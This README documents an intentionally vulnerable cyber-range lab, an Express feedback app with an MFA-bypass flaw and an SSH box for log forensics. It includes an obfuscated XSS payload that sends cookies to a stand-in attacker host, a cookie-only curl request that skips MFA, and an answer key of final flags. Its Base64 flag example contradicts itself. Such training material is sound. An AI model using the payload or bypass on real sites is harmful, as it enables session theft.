# Cyber Range Lab — "Cookie Reuse & MFA Bypass" (SCENARIO75)

A self-contained Red vs. Blue training lab built for the PT Nauli Mula Data
Cybersecurity Engineer practical assessment.

**⚠️ This app is intentionally vulnerable. Deploy only inside an isolated lab
network (e.g. a Proxmox VM on an internal-only vNIC). Never expose it to the
internet.**

## What's inside

| Component | Role | How to reach it |
|---|---|---|
| `feedback-app` | The vulnerable "Admin Feedback System" (Node.js/Express) | `http://<vm-ip>:3075` |
| `blue-team-ssh` | SSH box for log forensics | `ssh analyst@<vm-ip> -p 2275` (password: `blue_team_rocks`) |

Both containers share a Docker volume mounted at `/opt/admin/logs`
(`access.log` + `error.log`), read-write from the app, read-only from the
SSH box.

## 1. Deploying on a Proxmox VM

1. Spin up a small Linux VM on Proxmox (Ubuntu 22.04 is fine, 1 vCPU / 1–2 GB
   RAM is plenty), attached to an **internal-only** network/bridge
   (e.g. `feedback.admin.local`).
2. Install Docker + Docker Compose on the VM:
   ```bash
   curl -fsSL https://get.docker.com | sh
   sudo apt-get install -y docker-compose-plugin
   ```
3. Copy this repository onto the VM (git clone, scp, whatever you prefer).
4. From the repo root:
   ```bash
   docker compose up -d --build
   ```
5. Verify:
   ```bash
   curl -I http://localhost:3075/           # should show X-Powered-By: Node.js
   ssh analyst@localhost -p 2275            # password: blue_team_rocks
   ```

That's it — the log-seeding script runs automatically on first boot and
writes the synthetic attack story into `/opt/admin/logs`.

## 2. Red Team walkthrough (the exploit chain)

Think of it like this: you're trying to sneak into a building's admin office
without ever showing your ID at the front desk (MFA). You find a side door
that's supposed to be locked, but the lock logic only checks "do you have
*a* key?" — not "is this *the* key the front desk issued you?"

1. **Recon.**
   ```bash
   curl -I http://<vm-ip>:3075/
   # X-Powered-By: Node.js
   curl http://<vm-ip>:3075/robots.txt
   # Disallow: /api/verify-mfa, /dashboard  <- tells you exactly where the vault is
   curl -s http://<vm-ip>:3075/ | grep -A5 "SCENARIO75"
   # ASCII-art comment hints at checking robots.txt
   ```
   Visiting `/` also sets a `pre_mfa_session` cookie — check it in devtools
   and note `HttpOnly` is **not** set, so any JavaScript on the page (including
   injected JavaScript) can read it.

2. **WAF bypass (stored XSS).** The feedback form has a keyword filter that
   blocks the literal text `<script`:
   ```bash
   curl -X POST http://<vm-ip>:3075/feedback -d "comment=<script>alert(1)</script>"
   # 403 Blocked by WAF
   ```
   But it never looks for other HTML5 event-handler vectors:
   ```bash
   curl -X POST http://<vm-ip>:3075/feedback \
     --data-urlencode 'comment=<svg onload=fetch("http://ATTACKER/collect?c="+window["docu"+"ment"]["coo"+"kie"])>'
   # 200 OK — payload stored
   ```
   The bracket-notation (`window['docu'+'ment']['coo'+'kie']`) is a classic
   obfuscation trick to dodge log/WAF rules that just grep for the literal
   word `document.cookie`.

3. **Session replay → dashboard.** In a real engagement, an admin would
   eventually view the stored feedback, the payload would fire in *their*
   browser, and their real `adm_sess` cookie would be exfiltrated to the
   attacker. Here's the actual bug that matters for grading, though — you can
   demonstrate it live without needing a real admin victim at all:
   ```bash
   curl -b "adm_sess=anything_at_all" http://<vm-ip>:3075/dashboard
   ```
   This returns `200 OK` and the full dashboard — **`/api/verify-mfa` is
   never called or checked.** The backend only asks "does an `adm_sess`
   cookie exist?", not "was this session properly authenticated?". That
   logic flaw is the whole vulnerability.
4. The final flag is embedded in the dashboard HTML:
   `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}`

## 3. Blue Team walkthrough (log forensics)

SSH in as the analyst and look at the pre-seeded story:

```bash
ssh analyst@<vm-ip> -p 2275
cat /opt/admin/logs/access.log
cat /opt/admin/logs/error.log
```

Reading it top to bottom:

1. `192.168.1.100` is the normal admin workstation — baseline traffic.
2. `10.10.14.50` (subnet `10.10.14.0/24`) shows up at `18:50:15` with a
   blocked `<script>` attempt (`error.log`, `WARN`), then at `18:50:40`
   successfully submits a payload (the WAF bypass).
3. At `18:51:10` the admin's own session hits `/dashboard` (this is the XSS
   firing in the admin's browser) and at `18:51:12` a request to `/collect`
   carries a suspicious value in `X-Forwarded-For` — that's your exfiltration
   channel. Decode it:
   ```bash
   echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0==" | base64 -d
   ```
   > **Note:** the attacker stripped the trailing `=` padding to make the
   > string a little less obviously Base64 at a glance — add `==` back
   > before decoding. (The assignment brief says the encoded string should be
   > "44 characters" — as provided, it's actually 47/48 depending on
   > padding; worth flagging as a minor inconsistency in the brief during
   > your presentation rather than silently "fixing" the flag string.)
4. At `18:51:55`, `10.10.14.50` hits `/dashboard` directly and gets a clean
   `200` — **critically, there is no log entry anywhere of `10.10.14.50`
   ever touching `/api/verify-mfa`.** That absence is the smoking gun: MFA
   was never performed for that session.
5. `error.log` flags this at `18:53:10` as a `CRITICAL`
   `Authentication bypass anomaly`.
6. Decoding the Base64 string yields the final Blue Team flag:
   `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`

### Root cause & recommended fix (good to mention in the presentation)

- Store MFA-verified sessions server-side (Redis/DB), and have `/dashboard`
  validate the token against that store — not just check for cookie
  *presence*.
- Set `HttpOnly: true` (and `Secure`, in production) on all session cookies.
- Replace the keyword-based WAF with a proper output-encoding/CSP approach —
  deny-listing `<script>` alone is never sufficient against XSS.
- Alert on any admin-session cookie that appears without a preceding,
  correlated MFA-verification log entry for the same source IP/session.

## 4. Flag reference

| Phase | Flag |
|---|---|
| Final Red Team flag | `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}` |
| Final Blue Team flag | `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}` |

(All intermediate flags from the brief — headers, paths, cookie names,
timestamps, IPs, etc. — are reproduced exactly as specified throughout the
app and the seeded logs; see `app/server.js` and `scripts/generate-logs.sh`.)

## 5. Repository layout

```
.
├── app/
│   ├── Dockerfile
│   ├── entrypoint.sh      # seeds logs once, then starts the app
│   ├── package.json
│   └── server.js          # the vulnerable Admin Feedback System
├── ssh/
│   └── Dockerfile          # Blue Team SSH box (analyst / blue_team_rocks)
├── scripts/
│   └── generate-logs.sh    # writes the deterministic forensic story
├── docker-compose.yml
└── README.md
```
